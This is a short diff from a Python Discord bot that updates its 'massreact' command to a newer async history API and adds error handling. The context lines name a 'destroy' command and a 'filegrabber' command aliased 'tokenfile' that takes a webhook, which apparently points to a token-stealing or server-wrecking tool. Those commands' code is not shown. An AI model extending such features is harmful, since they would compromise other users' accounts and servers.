@@ -489,14 +489,19 @@ async def destroy(ctx):
 @bot.command()
 async def massreact(ctx, emote=None):
     await ctx.message.add_reaction('✅')
+    print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
     await ctx.message.delete()
     if emote is None:
         await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}massreact <emote>')
         return
-    messages = await ctx.message.channel.history(limit=20).flatten()
+    
+    messages = [message async for message in ctx.message.channel.history(limit=20)]
     for message in messages:
-        await message.add_reaction(emote)
-        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
+        try:
+            await message.add_reaction(emote)
+        except Exception as e:
+            print(f"Failed to react to message: {e}")
+
 
 @bot.command(aliases=["grabfile", "tokenfile"])
 async def filegrabber(ctx, webhook=None):
